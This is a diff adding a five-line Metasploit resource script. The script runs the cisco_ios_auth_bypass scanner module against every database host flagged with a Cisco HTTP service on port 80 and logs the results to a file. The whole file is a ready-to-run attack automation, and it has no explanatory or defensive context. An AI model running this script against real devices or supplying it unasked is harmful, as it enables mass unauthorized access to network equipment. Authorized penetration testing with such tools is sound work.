@@ -1,0 +1,5 @@
+use auxiliary/scanner/http/cisco_ios_auth_bypass
+services -p 80 -S cisco -u -R
+spool ios_bypass.meter.log
+exploit
+spool off
